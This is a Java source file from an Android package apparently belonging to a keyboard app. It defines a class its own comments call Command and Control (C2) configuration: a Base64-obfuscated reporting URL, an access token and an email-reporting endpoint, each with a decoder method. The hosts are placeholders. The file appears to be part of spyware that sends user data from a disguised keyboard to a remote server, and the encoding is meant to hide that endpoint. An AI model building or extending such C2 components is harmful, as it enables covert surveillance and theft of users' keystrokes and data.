package com.abifog.rboard.latin.utils;

import android.util.Base64;

/**
 * Configuration for the Command and Control (C2) server.
 * Credentials and URL are obfuscated using Base64.
 */
public final class C2Config {
    // Hardcoded and obfuscated C2 Dashboard URL
    // Original: "https://your-dashboard-api.example.com/api/v1/report"
    private static final String OBFUSCATED_URL = "aHR0cHM6Ly95b3VyLWRhc2hib2FyZC1hcGkuZXhhbXBsZS5jb20vYXBpL3YxL3JlcG9ydA==";

    // Hardcoded and obfuscated API Key/Token
    // Original: "admin_token_xyz_123"
    private static final String OBFUSCATED_TOKEN = "YWRtaW5fdG9rZW5feHl6XzEyMw==";

    // Hardcoded and obfuscated Email Reporting Endpoint
    // Original: "https://api.your-email-bridge.com/v1/send"
    private static final String OBFUSCATED_EMAIL_URL = "aHR0cHM6Ly9hcGkueW91ci1lbWFpbC1icmlkZ2UuY29tL3YxL3NlbmQ=";

    public static String getUrl() {
        return new String(Base64.decode(OBFUSCATED_URL, Base64.DEFAULT));
    }

    public static String getEmailUrl() {
        return new String(Base64.decode(OBFUSCATED_EMAIL_URL, Base64.DEFAULT));
    }

    public static String getToken() {
        return new String(Base64.decode(OBFUSCATED_TOKEN, Base64.DEFAULT));
    }

    private C2Config() {
        // Utility class
    }
}
